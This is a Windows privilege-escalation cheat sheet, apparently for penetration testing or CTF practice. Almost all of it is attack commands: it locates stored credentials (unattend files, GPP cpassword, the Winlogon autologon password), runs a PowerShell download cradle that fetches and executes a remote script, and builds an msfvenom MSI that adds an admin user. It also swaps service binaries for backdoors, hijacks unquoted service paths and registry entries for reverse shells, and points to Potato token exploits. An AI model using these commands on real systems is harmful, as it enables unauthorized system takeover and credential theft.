Windows Privilege Escalation by @nickvourd
==========================================

- [General Commands](#general-commands)
- [Stored Credentials](#stored-credentials)
- [Unattend Answer Files](#unattend-answer-files)
- [Windows Kernel Exploits](#windows-kernel-exploits)
- [Applications and Drivers Exploits](#applications-and-drivers-exploits)
- DLL Injection
- [Insecure File or Folder Permissions](#insecure-file-or-folder-permissions)
- Group Policy Preferences
- [Unquoted Service Path](#unquoted-service-path)
- [Always Install Elevated](#always-install-elevated)
- [Insecure Service Permissions](#insecure-service-permissions)
- DLL Hijacking
- [Insecure Registry Permissions](#insecure-registry-permissions)
- [Token Manipulation](#token-manipulation)
- [Autologon User Credentials](#autologon-user-credentials)
- [Autoruns](#autoruns)
- User Account Control (UAC) Bypass
- Insecure Named Pipes Permissions


# General Commands
* systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Processor(s)" /C:"System Locale" /C:"Input Locale" /C:"Domain" /C:"Hotfix(s)"
* WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors

* whoami
* whoami /priv
  * SeDebugPrivilege
  * SeRestorePrivilege
  * SeBackupPrivilege
  * SeTakeOwnershipPrivilege
  * SeTcbPrivilege
  * SeCreateToken Privilege
  * SeLoadDriver Privilege
  * SeImpersonate & SeAssignPrimaryToken Priv.

* whoami /groups

* net user
* net user <user>

* netstat -ano
* ipconfig /all
* route print
* 
* tasklist /SVC > tasks.txt
* schtasks /query /fo LIST /v > schedule.txt

* netsh advfirewall show currentprofile
* netsh advfirewall firewall show rule name=all


* wmic product get name, version, vendor > apps_versions.txt
* DRIVERQUERY
* mountvol

* accesschk-2008-vista.exe /accepteula
* accesschk-2008-vista.exe -uws "Everyone" "C:\Program Files"

* reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
* reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

# Stored Credentials
* net user
* net user <user>
* cmdkey /list
  -> if interactive module enabled 100% runas as other user
  -> if domain and user exist try again runas as other user

  * runas /savecred /user:<Domain>\<user> C:\<path>\<exefile>

* If system is running an IIS web server the web.config file:
  * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
  * C:\inetpub\wwwroot\web.config

* Local administrators passwords can also retrieved via the Group Policy Preferences:
  * C:\ProgramData\Microsoft\Group Policy\History????\Machine\Preferences\Groups\Groups.xml
  * \????\SYSVOL\Policies????\MACHINE\Preferences\Groups\Groups.xml

* Except of the Group.xml file the cpassword attribute can be found in other policy preference files as well such as:
  * Services\Services.xml
  * ScheduledTasks\ScheduledTasks.xml
  * Printers\Printers.xml
  * Drives\Drives.xml
  * DataSources\DataSources.xml

* Most Windows systems they are running McAfee as their endpoint protection. The password is stored encrypted in the SiteList.xml file:
  * %AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml

# Unattend Answer Files
* Unattended Installs allow for the deployment of Windows with little-to-no active involvement from an administrator.  This solution is ideal in larger organizations where it would be too labor and time-intensive to perform wide-scale deployments manually.  If administrators fail to clean up after this process, an EXtensible Markup Language (XML) file called Unattend is left on the local system.  This file contains all the configuration settings that were set during the installation process, some of which can include the configuration of local accounts, to include Administrator accounts!
* While it’s a good idea to search the entire drive, Unattend files are likely to be found within the following folders:
  * C:\unattend.xml
  * C:\Windows\Panther\Unattend.xml
  * C:\Windows\Panther\Unattend\Unattend.xml
  * C:\Windows\system32\sysprep.inf
  * C:\Windows\system32\sysprep\sysprep.xml

->  If you find one open it and search for <UserAccounts> tag. Stored as plaintext or base64.

# Windows Kernel Exploits
* systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Processor(s)" /C:"System Locale" /C:"Input Locale" /C:"Domain" /C:"Hotfix(s)"
  * searchsploit 
  * google

* WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors

* Windows-Exploit-Suggester
  * python windows-exploit-suggester.py --database 2020-08-09-mssb.xls --systeminfo grandpa.txt

* Serlock
  * Config: Add to the last line the "Find-AllVulns"
  * Download and run Sherlock:
     * echo IEX(New-Object Net.WebClient).DownloadString('http://<ip>:<port>/Sherlock.ps1') | powershell -noprofile -

* Watson
  * Find .NET latest version of victim:
     * dir %windir%\Microsoft.NET\Framework /AD     
   * Fow older than windows 10 download zip version of watson v.1: https://github.com/rasta-mouse/Watson/tree/486ff207270e4f4cadc94ddebfce1121ae7b5437
   * Build exe to visual studio

# Applications and Drivers Exploits
* wmic product get name, version, vendor > install_apps.txt
  * searchsploit
  * google

* driverquery /v > drivers.txt
* powershell: driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', 'Path'
* powershell and specific word: Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
  * searchsploit
  * google

# Insecure File or Folder Permissions
* use: https://download.sysinternals.com/files/AccessChk.zip
* Search for world writable files and directories:
  * accesschk.exe -uws "Everyone" "C:\Progrma Files"
  * powershell: Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
  
* Or find running proccess:
  * tasklist /SVC > tasks.txt
  * powershell:  Get-WmiObject win32_service | Select-Object Name, State, PathName| Where-Object {$_.State -like 'Running'}
  
-> Focus on Program Files or compare with a Defaults of your system.

* icacls "\<path>\<file>.exe"
  * if Permisions allow to have Full access or Write go to compile: https://github.com/nickvourd/windows_backdoor.git

* upload the new backdoor and rename the old exe with new exe

* net stop <service>
  *if access denied, use >wmic service where caption="<servicename>" get name, caption, state, startmode
    * if Auto attribute exists
 
* whoami /priv
  * if SeShutdownPrivilege then:
    *  shutdown /r /t 0 
    
When you will open you will have evil to administrators groups:
 *  net localgroup Administrators

# Unquoted Service Path
* Discover all the services that are running on the target host and identify those that are not enclosed inside quotes:
  * wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

* The next step is to try to identify the level of privilege that this service is running. This can be identified easily:
  * sc qc "\<service name>"
  
* Now we need to check the folder in which we can write to. Checking the same using icacls progressively into the folders:
  * icacls c:\<path>\
  * icacls c:\<path>\<path>
  * icacls c:\<path>\<path>\file.exe
  
* Create a new exe payload in line and copied with name of old exe.
* Open a nc listener.

* sc stop "<Service name>"
  * if access denied then use sc qc "<service name>" and find if service has attribute Auto_start.
  * whoami /priv 
    * if SeShutdownPrivilege then:
      * shutdown /r /t 0 

* after restart you will have nc listener.

wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\\\" |findstr /i /v """

# Always Install Elevated
* use the commands and if they return output then vulnerability exists:
  * reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
  * reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
  * reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
  
  * Generate a msi file: 
    * msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
   
  * Upload to machine
  * run the msi:
    * msiexec /quiet /qn /i C:\<path>\1.msi

  * net localgroup administrators
  * user should exists


# Insecure Service Permissions
* Detect is to find a service with weak permissions
  * accesschk.exe -uwcqv *
* For Shorten output
  * accesschk.exe -uwcqv "Authenticated Users" *
  * accesschk.exe -uwcqv "Everyone" *
* The output will be the service name, the group name and the permissions that group has. Anything like SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS is a win. In fact any of the following permissions are worth looking out for:
   * SERVICE_CHANGE_CONFIG
   * SERVICE_ALL_ACCESS
   * GENERIC_WRITE
   * GENERIC_ALL
   * WRITE_DAC
   * WRITE_OWNER
   
* If you have reconfiguration permissions, or can get them through the above permission list, then you can use the SC command to exploit the vulnerability:
   * sc config SERVICENAME binPath= "E:\Service.exe"
   * sc config SERVICENAME obj=".\LocalSystem" password=""
   * net stop SERVICENAME
   * net start SERVICENAME

* Stop and start the service again and you’re a Local Admin!

# Insecure Registry Permissions
Windows stores all the necessary data that is related to services in the registry key location below:

* reg query HKLM\SYSTEM\CurrentControlSet\Services
  * If you find a vulnerable service use the follwing command to see its details:
    * req query HKLM\SYSTEM\CurrentControlSet\Services\\\<servicename>

 * Find from which group is accessible this service
    * accesschk.exe /accepteula -uvwqk hklm\System\CurrentControleSet\Service\\\<servicename>
    
    * found if note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users).

 
 * generate a payload:
   * msfvenom –p windows/exec CMD=\<Command> -f exe-services –o \<service binery>
 
 * open a listener
 
 * Overweight the imagepath subkey of the valuable services with the path of the custom binary 
   * reg add HKLM\System\CurrentControleSet\Service\<Service nam> /v ImagePath /t REG_EXPAND_SZ /d <path_to_exe> /f 
   
 * start service:
   * net start <servicename>
 
 * take reverse shell

# Token Manipulation
* whoami /priv
* More info here: https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf
  * SeDebugPrivilege
  * SeRestorePrivilege
  * SeBackupPrivilege
  * SeTakeOwnershipPrivilege
  * SeTcbPrivilege
  * SeCreateToken Privilege
  * SeLoadDriver Privilege
  * SeImpersonate & SeAssignPrimaryToken Priv.

### Potatos
#### Hot Potato
* What is: Hot Potato (aka: Potato) takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing.
* Affected systems: Windows 7,8,10, Server 2008, Server 2012
* Guide: https://foxglovesecurity.com/2016/01/16/hot-potato/
* Use: https://github.com/foxglovesec/Potato

#### Rotten Potato
* What is: Rotten Potato and its standalone variants leverages the privilege escalation chain based on BITS service having the MiTM listener on 127.0.0.1:6666 and when you have SeImpersonate or SeAssignPrimaryToken privileges
* Affetced sytsems: Windows 7,8,10, Server 2008, Server 2012, Server 2016
* Guide: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ https://0xdf.gitlab.io/2018/08/04/htb-silo.html
* Use: https://github.com/nickvourd/lonelypotato
* Rotten Potato from default opens meterpreter, use lonely potato which opens in line shell

#### Juicy Potato
* What is: Juicy potato is basically a weaponized version of the RottenPotato exploit that exploits the way Microsoft handles tokens. Through this, we achieve privilege escalation.

* Affetcted Systems:

  * Windows 7 Enterprise
  * Windows 8.1 Enterprise
  * Windows 10 Enterprise
  * Windows 10 Professional
  * Windows Server 2008 R2 Enterprise
  * Windows Server 2012 Datacenter
  * Windows Server 2016 Standard

* Find CLSID here: https://ohpe.it/juicy-potato/CLSID/
* Warning: Juicy Potato doesn’t work in Windows Server 2019
* Guides:
1) https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges 
2) https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato#:~:text=Juicy%20potato%20is%20basically%20a,this%2C%20we%20achieve%20privilege%20escalation.
* Use: https://github.com/ohpe/juicy-potato

# Autologon User Credentials
* use the following command and if return output take autologon user credentials from regisrty:
  * reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
  
# Autoruns
* Find auto tun executables:
  * reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  
* Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:
  * accesschk.exe /accepteula -wvu "\\\<path>\\\<file.exe>"
